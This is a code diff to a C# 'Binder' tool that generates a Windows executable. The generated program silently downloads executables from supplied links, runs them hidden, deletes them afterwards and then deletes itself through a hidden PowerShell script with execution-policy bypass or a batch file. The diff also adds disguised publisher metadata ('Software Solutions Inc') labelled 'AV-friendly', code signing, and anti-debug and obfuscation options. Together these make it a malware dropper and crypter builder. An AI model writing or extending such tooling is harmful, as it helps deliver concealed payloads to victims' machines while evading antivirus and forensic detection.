@@ -33,14 +33,7 @@ namespace Binder
                     return;
                 }
 
-                // Get execution location preference
-                Console.WriteLine("\nChoose execution location:");
-                Console.WriteLine("1. %TEMP% folder (recommended)");
-                Console.WriteLine("2. Same folder as the binder");
-                Console.Write("Enter your choice (1 or 2): ");
-                
-                string? locationChoice = Console.ReadLine();
-                bool useTempFolder = locationChoice != "2";
+                // Individual execution location will be chosen per executable
 
                 // Get obfuscation preference
                 Console.Write("\nDo you want to obfuscate the generated code? (y/n): ");
@@ -69,6 +62,36 @@ namespace Binder
                 string? antiDebugChoice = Console.ReadLine();
                 bool useAntiDebug = antiDebugChoice?.ToLower() == "y" || antiDebugChoice?.ToLower() == "yes";
 
+                // Get self-deletion preference
+                Console.Write("\nDo you want the binder to delete itself after completing all tasks? (y/n): ");
+                string? selfDeleteChoice = Console.ReadLine();
+                bool deleteSelf = selfDeleteChoice?.ToLower() == "y" || selfDeleteChoice?.ToLower() == "yes";
+
+                // Get code signing preference
+                Console.Write("\nDo you want to sign the generated executable? (y/n): ");
+                string? signChoice = Console.ReadLine();
+                bool useCodeSigning = signChoice?.ToLower() == "y" || signChoice?.ToLower() == "yes";
+                
+                string? certificatePath = null;
+                string? certificatePassword = null;
+                string? timestampUrl = null;
+                
+                if (useCodeSigning)
+                {
+                    Console.Write("Enter path to certificate file (.pfx/.p12): ");
+                    certificatePath = Console.ReadLine();
+                    
+                    Console.Write("Enter certificate password (leave empty if none): ");
+                    certificatePassword = ReadPassword();
+                    
+                    Console.Write("Enter timestamp server URL (leave empty for default): ");
+                    timestampUrl = Console.ReadLine();
+                    if (string.IsNullOrWhiteSpace(timestampUrl))
+                    {
+                        timestampUrl = "http://timestamp.digicert.com";
+                    }
+                }
+
                 // Get custom icon preference
                 Console.Write("\nDo you want to use a custom icon for the output? (y/n): ");
                 string? iconChoice = Console.ReadLine();
@@ -94,7 +117,7 @@ namespace Binder
                     }
                 }
 
-                // Get executable details with individual stub links
+                // Get executable details with individual stub links and execution locations
                 var executables = new List<ExecutableInfo>();
                 for (int i = 0; i < exeCount; i++)
                 {
@@ -122,11 +145,23 @@ namespace Binder
                         return;
                     }
 
-                    executables.Add(new ExecutableInfo { Filename = filename, StubLink = stubLink });
+                    Console.WriteLine("Choose execution location for this executable:");
+                    Console.WriteLine("1. %TEMP% folder (recommended)");
+                    Console.WriteLine("2. Same folder as the binder");
+                    Console.Write("Enter your choice (1 or 2): ");
+                    
+                    string? locationChoice = Console.ReadLine();
+                    bool useTempFolder = locationChoice != "2";
+
+                    Console.Write("Delete this executable after execution? (y/n): ");
+                    string? deleteChoice = Console.ReadLine();
+                    bool deleteAfterExecution = deleteChoice?.ToLower() == "y" || deleteChoice?.ToLower() == "yes";
+
+                    executables.Add(new ExecutableInfo { Filename = filename, StubLink = stubLink, UseTempFolder = useTempFolder, DeleteAfterExecution = deleteAfterExecution });
                 }
 
                 // Generate the binder code
-                string binderCode = GenerateBinderCode(executables, useTempFolder, useObfuscation, customTimeout, useAntiDebug, useCustomIcon, iconUrl);
+                string binderCode = GenerateBinderCode(executables, useObfuscation, customTimeout, useAntiDebug, useCustomIcon, iconUrl, deleteSelf);
                 
                 // Create temporary project directory
                 string tempProjectDir = "GeneratedBinder";
@@ -162,24 +197,23 @@ namespace Binder
                 string binderCodePath = Path.Combine(tempProjectDir, "Program.cs");
                 File.WriteAllText(binderCodePath, binderCode, Encoding.UTF8);
                 
-                                                                 // Create project file
+                                                                 // Create project file with AV-friendly settings
                 string projectContent = @"<Project Sdk=""Microsoft.NET.Sdk"">
     <PropertyGroup>
-      <OutputType>Exe</OutputType>
+      <OutputType>WinExe</OutputType>
       <TargetFramework>net6.0</TargetFramework>
       <ImplicitUsings>enable</ImplicitUsings>
       <Nullable>enable</Nullable>
       <SelfContained>true</SelfContained>
       <RuntimeIdentifier>win-x64</RuntimeIdentifier>
       <PublishSingleFile>true</PublishSingleFile>
-      <PublishTrimmed>true</PublishTrimmed>
-      <TrimMode>link</TrimMode>
-      <AssemblyTitle>GeneratedBinder</AssemblyTitle>
-      <AssemblyDescription>Generated Executable Binder</AssemblyDescription>
-      <AssemblyCompany>Binder</AssemblyCompany>
-      <AssemblyProduct>GeneratedBinder</AssemblyProduct>
-      <AssemblyVersion>1.0.0.0</AssemblyVersion>
-      <FileVersion>1.0.0.0</FileVersion>" + 
+      <PublishTrimmed>false</PublishTrimmed>
+      <AssemblyTitle>Application Launcher</AssemblyTitle>
+      <AssemblyDescription>Software Deployment Utility</AssemblyDescription>
+      <AssemblyCompany>Software Solutions Inc</AssemblyCompany>
+      <AssemblyProduct>Application Launcher</AssemblyProduct>
+      <AssemblyVersion>2.1.0.0</AssemblyVersion>
+      <FileVersion>2.1.0.0</FileVersion>" + 
       (useCustomIcon && !string.IsNullOrEmpty(iconFileToUse) ? $"\n     <ApplicationIcon>{iconFileToUse}</ApplicationIcon>" : "") + @"
     </PropertyGroup>
   </Project>";
@@ -228,17 +262,42 @@ namespace Binder
                     if (File.Exists(sourceExe))
                     {
                         File.Copy(sourceExe, finalExe, true);
+
+                        // Sign the executable if requested
+                        if (useCodeSigning && !string.IsNullOrEmpty(certificatePath))
+                        {
+                            Console.ForegroundColor = ConsoleColor.Yellow;
+                            Console.WriteLine("🔐 Signing executable...");
+                            Console.ResetColor();
+                            
+                            bool signSuccess = SignExecutable(finalExe, certificatePath, certificatePassword, timestampUrl);
+                            
+                            if (signSuccess)
+                            {
+                                Console.ForegroundColor = ConsoleColor.Green;
+                                Console.WriteLine("✓ Executable signed successfully");
+                                Console.ResetColor();
+                            }
+                            else
+                            {
+                                Console.ForegroundColor = ConsoleColor.Yellow;
+                                Console.WriteLine("⚠ Warning: Code signing failed, but executable was created");
+                                Console.ResetColor();
+                            }
+                        }
                         
                         Console.ForegroundColor = ConsoleColor.Green;
                         Console.WriteLine($"\n✓ Binder executable created successfully!");
                         Console.WriteLine($"✓ Executable: {finalExe}");
                         Console.WriteLine($"✓ {exeCount} executables configured");
-                        Console.WriteLine($"✓ Execution location: {(useTempFolder ? "%TEMP%" : "Same folder")}");
+                        Console.WriteLine($"✓ Execution locations: Individual per executable");
                         Console.WriteLine($"✓ {exeCount} stub links configured");
                         Console.WriteLine($"✓ Obfuscation: {(useObfuscation ? "Enabled" : "Disabled")}");
                         Console.WriteLine($"✓ Timeout: {(customTimeout > 0 ? $"{customTimeout} seconds" : "No timeout")}");
                         Console.WriteLine($"✓ Anti-debugger: {(useAntiDebug ? "Enabled" : "Disabled")}");
+                        Console.WriteLine($"✓ Self-deletion: {(deleteSelf ? "Enabled" : "Disabled")}");
                         Console.WriteLine($"✓ Custom Icon: {(useCustomIcon ? $"{(iconFileToUse ?? "Enabled")}" : "Default")}");
+                        Console.WriteLine($"✓ Code signing: {(useCodeSigning ? "Enabled" : "Disabled")}");
                         Console.ResetColor();
                         
                         // Clean up temporary files
@@ -370,7 +429,163 @@ namespace Binder
             return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
         }
 
-        static string GenerateBinderCode(List<ExecutableInfo> executables, bool useTempFolder, bool useObfuscation, int timeout, bool useAntiDebug, bool useCustomIcon, string? iconUrl)
+        static string ReadPassword()
+        {
+            string password = "";
+            ConsoleKeyInfo key;
+            do
+            {
+                key = Console.ReadKey(true);
+                if (key.Key != ConsoleKey.Backspace && key.Key != ConsoleKey.Enter)
+                {
+                    password += key.KeyChar;
+                    Console.Write("*");
+                }
+                else if (key.Key == ConsoleKey.Backspace && password.Length > 0)
+                {
+                    password = password.Substring(0, (password.Length - 1));
+                    Console.Write("\b \b");
+                }
+            } while (key.Key != ConsoleKey.Enter);
+            Console.WriteLine();
+            return password;
+        }
+
+        static bool SignExecutable(string exePath, string certificatePath, string? password, string? timestampUrl)
+        {
+            try
+            {
+                // Check if signtool is available
+                string signToolPath = FindSignTool();
+                if (string.IsNullOrEmpty(signToolPath))
+                {
+                    Console.WriteLine("⚠ Warning: signtool.exe not found. Please install Windows SDK.");
+                    return false;
+                }
+
+                // Check if certificate file exists
+                if (!File.Exists(certificatePath))
+                {
+                    Console.WriteLine($"⚠ Warning: Certificate file not found: {certificatePath}");
+                    return false;
+                }
+
+                // Build signtool arguments
+                var args = new StringBuilder();
+                args.Append("sign ");
+                args.Append($"/f \"{certificatePath}\" ");
+                
+                if (!string.IsNullOrEmpty(password))
+                {
+                    args.Append($"/p \"{password}\" ");
+                }
+                
+                if (!string.IsNullOrEmpty(timestampUrl))
+                {
+                    args.Append($"/t \"{timestampUrl}\" ");
+                }
+                
+                args.Append($"\"{exePath}\"");
+
+                // Execute signtool
+                var startInfo = new ProcessStartInfo
+                {
+                    FileName = signToolPath,
+                    Arguments = args.ToString(),
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    CreateNoWindow = true
+                };
+
+                using var process = Process.Start(startInfo);
+                if (process == null) return false;
+
+                string output = process.StandardOutput.ReadToEnd();
+                string error = process.StandardError.ReadToEnd();
+                process.WaitForExit();
+
+                if (process.ExitCode == 0)
+                {
+                    return true;
+                }
+                else
+                {
+                    Console.WriteLine($"Signing error: {error}");
+                    return false;
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Signing exception: {ex.Message}");
+                return false;
+            }
+        }
+
+        static string FindSignTool()
+        {
+            // Common paths for signtool.exe
+            string[] possiblePaths = {
+                @"C:\Program Files (x86)\Windows Kits\10\bin\10.0.22621.0\x64\signtool.exe",
+                @"C:\Program Files (x86)\Windows Kits\10\bin\10.0.20348.0\x64\signtool.exe",
+                @"C:\Program Files (x86)\Windows Kits\10\bin\10.0.19041.0\x64\signtool.exe",
+                @"C:\Program Files (x86)\Windows Kits\10\bin\10.0.18362.0\x64\signtool.exe",
+                @"C:\Program Files (x86)\Windows Kits\10\bin\x64\signtool.exe",
+                @"C:\Program Files\Microsoft SDKs\Windows\v7.1A\Bin\signtool.exe",
+                @"C:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A\Bin\signtool.exe"
+            };
+
+            foreach (string path in possiblePaths)
+            {
+                if (File.Exists(path))
+                {
+                    return path;
+                }
+            }
+
+            // Try to find in Windows Kits directory
+            string windowsKitsPath = @"C:\Program Files (x86)\Windows Kits\10\bin";
+            if (Directory.Exists(windowsKitsPath))
+            {
+                var signtools = Directory.GetFiles(windowsKitsPath, "signtool.exe", SearchOption.AllDirectories);
+                if (signtools.Length > 0)
+                {
+                    // Prefer x64 version
+                    var x64Version = signtools.FirstOrDefault(s => s.Contains("x64"));
+                    return x64Version ?? signtools[0];
+                }
+            }
+
+            // Try PATH environment variable
+            try
+            {
+                var startInfo = new ProcessStartInfo
+                {
+                    FileName = "where",
+                    Arguments = "signtool",
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    CreateNoWindow = true
+                };
+
+                using var process = Process.Start(startInfo);
+                if (process != null)
+                {
+                    string output = process.StandardOutput.ReadToEnd().Trim();
+                    process.WaitForExit();
+                    
+                    if (process.ExitCode == 0 && !string.IsNullOrEmpty(output))
+                    {
+                        return output.Split('\n')[0].Trim();
+                    }
+                }
+            }
+            catch { }
+
+            return string.Empty;
+        }
+
+        static string GenerateBinderCode(List<ExecutableInfo> executables, bool useObfuscation, int timeout, bool useAntiDebug, bool useCustomIcon, string? iconUrl, bool deleteSelf)
         {
             var sb = new StringBuilder();
             
@@ -448,14 +663,9 @@ namespace Binder
             }
             sb.AppendLine("");
             
-            if (useTempFolder)
-            {
-                sb.AppendLine("            string tempPath = Path.GetTempPath();");
-            }
-            else
-            {
-                sb.AppendLine("            string currentDir = AppDomain.CurrentDomain.BaseDirectory;");
-            }
+            // Set up both path variables for individual use
+            sb.AppendLine("            string tempPath = Path.GetTempPath();");
+            sb.AppendLine("            string currentDir = AppDomain.CurrentDomain.BaseDirectory;");
             sb.AppendLine("");
             
             // Download and execute each stub
@@ -472,7 +682,7 @@ namespace Binder
                 sb.AppendLine($"                byte[] {dataVar} = await httpClient.GetByteArrayAsync({varName});");
                 sb.AppendLine($"                ");
                 
-                if (useTempFolder)
+                if (exe.UseTempFolder)
                 {
                     sb.AppendLine($"                string {pathVar} = Path.Combine(tempPath, \"{exe.Filename}\");");
                 }
@@ -485,11 +695,26 @@ namespace Binder
                 sb.AppendLine($"                ");
                 sb.AppendLine($"                var {processVar} = new ProcessStartInfo {{");
                 sb.AppendLine($"                    FileName = {pathVar},");
+                sb.AppendLine($"                    UseShellExecute = false,");
                 sb.AppendLine($"                    CreateNoWindow = true,");
                 sb.AppendLine($"                    WindowStyle = ProcessWindowStyle.Hidden");
                 sb.AppendLine($"                }};");
                 sb.AppendLine($"                ");
                 sb.AppendLine($"                Process.Start({processVar});");
+                
+                // Add deletion logic if requested
+                if (exe.DeleteAfterExecution)
+                {
+                    sb.AppendLine($"                ");
+                    sb.AppendLine($"                // Delete the executable after execution");
+                    sb.AppendLine($"                try {{");
+                    sb.AppendLine($"                    await Task.Delay(2000); // Wait 2 seconds for process to start");
+                    sb.AppendLine($"                    File.Delete({pathVar});");
+                    sb.AppendLine($"                }} catch {{");
+                    sb.AppendLine($"                    // Silent error handling for deletion");
+                    sb.AppendLine($"                }}");
+                }
+                
                 sb.AppendLine($"            }} catch (Exception ex{i + 1}) {{");
                 sb.AppendLine($"                // Silent error handling for {exe.Filename}");
                 sb.AppendLine($"            }}");
@@ -497,6 +722,53 @@ namespace Binder
                 {
                     sb.AppendLine($"            ");
                 }
+            }
+            
+            // Add self-deletion logic if requested
+            if (deleteSelf)
+            {
+                sb.AppendLine("");
+                sb.AppendLine("            // Self-deletion after all tasks completed");
+                sb.AppendLine("            try {");
+                sb.AppendLine("                // Get current executable path - try multiple methods");
+                sb.AppendLine("                string currentExe = Environment.ProcessPath ?? ");
+                sb.AppendLine("                                   System.Reflection.Assembly.GetExecutingAssembly().Location ??");
+                sb.AppendLine("                                   Environment.GetCommandLineArgs()[0];");
+                sb.AppendLine("                ");
+                sb.AppendLine("                if (!string.IsNullOrEmpty(currentExe) && File.Exists(currentExe)) {");
+                sb.AppendLine("                    // Create PowerShell script for more reliable deletion");
+                sb.AppendLine("                    string psPath = Path.Combine(Path.GetTempPath(), $\"cleanup_{Guid.NewGuid():N}.ps1\");");
+                sb.AppendLine("                    string psContent = $\"Start-Sleep -Seconds 1; Remove-Item -Path '{currentExe}' -Force -ErrorAction SilentlyContinue; Remove-Item -Path '{psPath}' -Force -ErrorAction SilentlyContinue\";");
+                sb.AppendLine("                    File.WriteAllText(psPath, psContent);");
+                sb.AppendLine("                    ");
+                sb.AppendLine("                    // Try PowerShell first");
+                sb.AppendLine("                    try {");
+                sb.AppendLine("                        Process.Start(new ProcessStartInfo {");
+                sb.AppendLine("                            FileName = \"powershell.exe\",");
+                sb.AppendLine("                            Arguments = $\"-WindowStyle Hidden -ExecutionPolicy Bypass -File \\\"{psPath}\\\"\",");
+                sb.AppendLine("                            UseShellExecute = false,");
+                sb.AppendLine("                            CreateNoWindow = true,");
+                sb.AppendLine("                            WindowStyle = ProcessWindowStyle.Hidden");
+                sb.AppendLine("                        });");
+                sb.AppendLine("                    } catch {");
+                sb.AppendLine("                        // Fallback to batch file method");
+                sb.AppendLine("                        string batchPath = Path.Combine(Path.GetTempPath(), $\"cleanup_{Guid.NewGuid():N}.bat\");");
+                sb.AppendLine("                        string batchContent = $\"@echo off\\ntimeout /t 1 /nobreak > nul\\nattrib -r -s -h \\\"{currentExe}\\\" 2>nul\\ndel /f /q \\\"{currentExe}\\\" 2>nul\\ndel /f /q \\\"{batchPath}\\\" 2>nul\";");
+                sb.AppendLine("                        File.WriteAllText(batchPath, batchContent);");
+                sb.AppendLine("                        Process.Start(new ProcessStartInfo {");
+                sb.AppendLine("                            FileName = batchPath,");
+                sb.AppendLine("                            UseShellExecute = false,");
+                sb.AppendLine("                            CreateNoWindow = true,");
+                sb.AppendLine("                            WindowStyle = ProcessWindowStyle.Hidden");
+                sb.AppendLine("                        });");
+                sb.AppendLine("                    }");
+                sb.AppendLine("                    ");
+                sb.AppendLine("                    // Exit immediately after starting deletion");
+                sb.AppendLine("                    Environment.Exit(0);");
+                sb.AppendLine("                }");
+                sb.AppendLine("            } catch {");
+                sb.AppendLine("                // Silent error handling for self-deletion");
+                sb.AppendLine("            }");
             }
             
             sb.AppendLine("        }");
@@ -511,6 +783,7 @@ namespace Binder
     {
         public string Filename { get; set; } = string.Empty;
         public string StubLink { get; set; } = string.Empty;
+        public bool UseTempFolder { get; set; } = true;
+        public bool DeleteAfterExecution { get; set; } = false;
     }
-
 } 
